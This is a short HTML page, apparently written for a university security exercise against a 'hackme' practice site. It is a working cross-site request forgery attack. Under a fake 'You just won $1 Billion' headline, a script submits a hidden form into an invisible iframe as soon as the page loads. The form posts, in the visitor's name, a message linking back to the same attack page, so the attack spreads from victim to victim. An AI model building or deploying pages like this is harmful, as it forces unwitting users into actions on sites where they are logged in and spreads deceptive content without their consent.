<html>
	<body>
		<h1> Cha-ching! You just won $1 Billion and a trip around Europe!! </h1>
		<iframe name="hiddenFrame" width="0" height="0" border="0" style="display: none;"></iframe>
		<form method="post" action="http://fiona.utdallas.edu/~yxf160330/hackme/post.php" target="hiddenFrame">
			<input type="hidden" name="title" value="awesome free stuff!!"/>
			<input type="hidden" name="message" value="<a href=http://fiona.utdallas.edu/~yxf160330/Q3/CSRF.php> Click me </a> to retrieve free cash and some surprise!">
			<input name="post_submit" type="hidden" id="post_submit" value="POST" />
		</form>

	<script> document.forms[0].submit(); </script>

	</body>
</html>
